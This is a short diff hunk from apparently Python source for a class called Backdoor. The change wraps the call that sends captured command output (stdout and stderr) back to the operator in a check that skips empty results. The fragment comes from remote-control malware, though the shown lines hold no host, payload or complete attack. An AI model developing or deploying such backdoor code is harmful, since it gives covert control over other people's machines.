@@ -71,7 +71,8 @@ class Backdoor(object):
             result = result.stdout.read() + result.stderr.read()
 
         print("Result: %s" % result)
-        self.sendResult(result)
+        if result is not "":
+            self.sendResult(result)
         time.sleep(0.1)
 
     def sendResult(self, data):
